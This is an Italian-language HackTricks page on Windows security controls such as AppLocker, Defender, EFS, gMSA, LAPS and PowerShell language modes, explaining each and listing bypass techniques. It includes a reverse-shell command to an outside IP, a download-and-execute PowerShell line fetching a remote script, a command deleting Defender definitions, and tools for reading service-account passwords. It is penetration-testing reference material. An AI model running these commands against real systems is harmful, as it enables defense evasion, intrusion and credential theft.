# Windows Security Controls

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Politica di AppLocker

Un elenco bianco delle applicazioni è un elenco di applicazioni software o eseguibili approvati che sono autorizzati a essere presenti ed eseguiti su un sistema. L'obiettivo è proteggere l'ambiente da malware dannosi e software non approvati che non sono in linea con le specifiche esigenze aziendali di un'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **soluzione di elenco bianco delle applicazioni** di Microsoft e dà ai sistemisti il controllo su **quali applicazioni e file gli utenti possono eseguire**. Fornisce un **controllo granulare** su eseguibili, script, file di installazione di Windows, DLL, app confezionate e installatori di app confezionate.\
È comune per le organizzazioni **bloccare cmd.exe e PowerShell.exe** e l'accesso in scrittura a determinate directory, **ma tutto ciò può essere bypassato**.

### Verifica

Verifica quali file/estensioni sono inseriti in blacklist/elenco bianco:

```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Questo percorso del registro contiene le configurazioni e le politiche applicate da AppLocker, fornendo un modo per rivedere l'attuale set di regole applicate sul sistema:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

* **Cartelle scrivibili** utili per aggirare la Policy di AppLocker: Se AppLocker consente di eseguire qualsiasi cosa all'interno di `C:\Windows\System32` o `C:\Windows`, ci sono **cartelle scrivibili** che puoi utilizzare per **aggirare ciò**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

* Comunemente i binari **affidabili** [**"LOLBAS's"**](https://lolbas-project.github.io/) possono essere utili anche per aggirare AppLocker.
* Le regole **scritte male** potrebbero essere aggirate.
* Ad esempio, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puoi creare una **cartella chiamata `allowed`** ovunque e sarà consentita.
* Le organizzazioni spesso si concentrano sul **blocco dell'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma dimenticano gli **altri** [**posizioni degli eseguibili di PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
* **L'applicazione delle DLL è molto raramente abilitata** a causa del carico aggiuntivo che può mettere su un sistema e della quantità di test richiesti per garantire che nulla si rompa. Quindi utilizzare **DLL come backdoor aiuterà ad aggirare AppLocker**.
* Puoi utilizzare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e aggirare AppLocker. Per ulteriori informazioni, controlla: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Archiviazione delle credenziali

### Gestore account di sicurezza (SAM)

Le credenziali locali sono presenti in questo file, le password sono hashate.

### Autorità di sicurezza locale (LSA) - LSASS

Le **credenziali** (hashate) sono **salvate** nella **memoria** di questo sottosistema per motivi di Single Sign-On.\
**LSA** amministra la **policy di sicurezza** locale (policy delle password, permessi degli utenti...), **autenticazione**, **token di accesso**...\
LSA sarà colui che **verificherà** le credenziali fornite all'interno del file **SAM** (per un accesso locale) e **comunicherà** con il **domain controller** per autenticare un utente di dominio.

Le **credenziali** sono **salvate** all'interno del **processo LSASS**: biglietti Kerberos, hash NT e LM, password facilmente decifrabili.

### Segreti LSA

LSA potrebbe salvare su disco alcune credenziali:

* Password dell'account del computer dell'Active Directory (domain controller non raggiungibile).
* Password degli account dei servizi Windows
* Password per attività pianificate
* Altro (password delle applicazioni IIS...)

### NTDS.dit

È il database dell'Active Directory. È presente solo nei Domain Controller.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) è un Antivirus disponibile in Windows 10 e Windows 11, e nelle versioni di Windows Server. **Blocca** strumenti comuni di pentesting come **`WinPEAS`**. Tuttavia, ci sono modi per **aggirare queste protezioni**.

### Verifica

Per verificare lo **stato** di **Defender** puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per enumerarlo potresti eseguire anche:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Sistema di File Crittografato (EFS)

EFS protegge i file attraverso la crittografia, utilizzando una **chiave simmetrica** nota come **File Encryption Key (FEK)**. Questa chiave è crittografata con la **chiave pubblica** dell'utente e memorizzata all'interno dello **stream di dati alternativo** $EFS del file crittografato. Quando è necessaria la decrittazione, la corrispondente **chiave privata** del certificato digitale dell'utente viene utilizzata per decrittare il FEK dallo stream $EFS. Ulteriori dettagli possono essere trovati [qui](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

Gli **scenario di decrittazione senza iniziativa dell'utente** includono:

* Quando i file o le cartelle vengono spostati su un sistema di file non EFS, come [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), vengono decrittografati automaticamente.
* I file crittografati inviati sulla rete tramite il protocollo SMB/CIFS vengono decrittografati prima della trasmissione.

Questo metodo di crittografia consente un **accesso trasparente** ai file crittografati per il proprietario. Tuttavia, semplicemente cambiare la password del proprietario e accedere non permetterà la decrittazione.

**Punti chiave**:

* EFS utilizza un FEK simmetrico, crittografato con la chiave pubblica dell'utente.
* La decrittazione impiega la chiave privata dell'utente per accedere al FEK.
* La decrittazione automatica avviene in condizioni specifiche, come la copia su FAT32 o la trasmissione di rete.
* I file crittografati sono accessibili al proprietario senza passaggi aggiuntivi.

### Verifica delle informazioni EFS

Verifica se un **utente** ha **utilizzato** questo **servizio** controllando se questo percorso esiste: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifica **chi** ha **accesso** al file utilizzando cipher /c \<file>\
Puoi anche utilizzare `cipher /e` e `cipher /d` all'interno di una cartella per **crittografare** e **decrittografare** tutti i file

### Decrittazione dei file EFS

#### Essere l'Autorità di Sistema

Questo metodo richiede che l'**utente vittima** stia **eseguendo** un **processo** all'interno dell'host. In tal caso, utilizzando sessioni `meterpreter`, puoi impersonare il token del processo dell'utente (`impersonate_token` da `incognito`). Oppure potresti semplicemente `migrare` al processo dell'utente.

#### Conoscere la password degli utenti

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Account di Servizio Gestiti dal Gruppo (gMSA)

Microsoft ha sviluppato gli **Account di Servizio Gestiti dal Gruppo (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza degli account di servizio tradizionali che spesso hanno l'impostazione "**Password mai scade**" abilitata, i gMSA offrono una soluzione più sicura e gestibile:

* **Gestione Automatica delle Password**: i gMSA utilizzano una password complessa di 240 caratteri che cambia automaticamente in base alla policy del dominio o del computer. Questo processo è gestito dal Key Distribution Service (KDC) di Microsoft, eliminando la necessità di aggiornamenti manuali delle password.
* **Sicurezza Potenziata**: Questi account sono immuni ai blocchi e non possono essere utilizzati per accessi interattivi, migliorando la loro sicurezza.
* **Supporto Multi-Host**: i gMSA possono essere condivisi su più host, rendendoli ideali per servizi in esecuzione su server multipli.
* **Capacità di Attività Pianificate**: a differenza degli account di servizio gestiti, i gMSA supportano l'esecuzione di attività pianificate.
* **Gestione Semplificata degli SPN**: il sistema aggiorna automaticamente il Service Principal Name (SPN) quando ci sono modifiche ai dettagli sAMaccount del computer o al nome DNS, semplificando la gestione degli SPN.

Le password per i gMSA sono memorizzate nella proprietà LDAP _**msDS-ManagedPassword**_ e vengono ripristinate automaticamente ogni 30 giorni dai Domain Controller (DC). Questa password, un blob di dati crittografati noto come [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), può essere recuperata solo da amministratori autorizzati e dai server su cui sono installati i gMSA, garantendo un ambiente sicuro. Per accedere a queste informazioni, è richiesta una connessione sicura come LDAPS, oppure la connessione deve essere autenticata con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Puoi leggere questa password con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Trova ulteriori informazioni in questo post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Inoltre, controlla questa [pagina web](https://cube0x0.github.io/Relaying-for-gMSA/) su come eseguire un attacco di **NTLM relay** per **leggere** la **password** di **gMSA**.

## LAPS

La **Local Administrator Password Solution (LAPS)**, disponibile per il download da [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), consente la gestione delle password degli amministratori locali. Queste password, che sono **casuali**, uniche e **cambiate regolarmente**, sono memorizzate centralmente in Active Directory. L'accesso a queste password è limitato tramite ACL agli utenti autorizzati. Con le autorizzazioni sufficienti concesse, viene fornita la capacità di leggere le password degli amministratori locali.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blocca molte delle funzionalità** necessarie per utilizzare PowerShell in modo efficace, come il blocco degli oggetti COM, consentendo solo tipi .NET approvati, flussi di lavoro basati su XAML, classi PowerShell e altro.

### **Controlla**

```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Ignora

```powershell
#Easy bypass
Powershell -version 2
```

In Windows attuale quel Bypass non funzionerà ma puoi utilizzare [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potresti aver bisogno di** **Aggiungere un Riferimento** -> _Sfoglia_ -> _Sfoglia_ -> aggiungi `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **cambia il progetto in .Net4.5**.

#### Bypass diretto:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Shell inversa:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Puoi utilizzare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare la modalità vincolata. Per ulteriori informazioni consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Politica di esecuzione di PS

Di default è impostata su **restricted.** Principali modi per bypassare questa politica:

```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

## Interfaccia del Provider di supporto alla sicurezza (SSPI)

È l'API che può essere utilizzata per autenticare gli utenti.

Lo SSPI si occuperà di trovare il protocollo adeguato per due macchine che desiderano comunicare. Il metodo preferito per questo è Kerberos. Successivamente, lo SSPI negozierà quale protocollo di autenticazione verrà utilizzato; questi protocolli di autenticazione sono chiamati Provider di supporto alla sicurezza (SSP), sono situati all'interno di ciascuna macchina Windows sotto forma di DLL e entrambe le macchine devono supportare lo stesso per poter comunicare.

### Principali SSP

* **Kerberos**: Il preferito
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** e **NTLMv2**: Motivi di compatibilità
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Server Web e LDAP, password sotto forma di hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL e TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Viene utilizzato per negoziare il protocollo da utilizzare (Kerberos o NTLM essendo Kerberos quello predefinito)
* %windir%\Windows\System32\lsasrv.dll

#### La negoziazione potrebbe offrire diversi metodi o solo uno.

## UAC - Controllo dell'account utente

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **prompt di consenso per attività elevate**.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
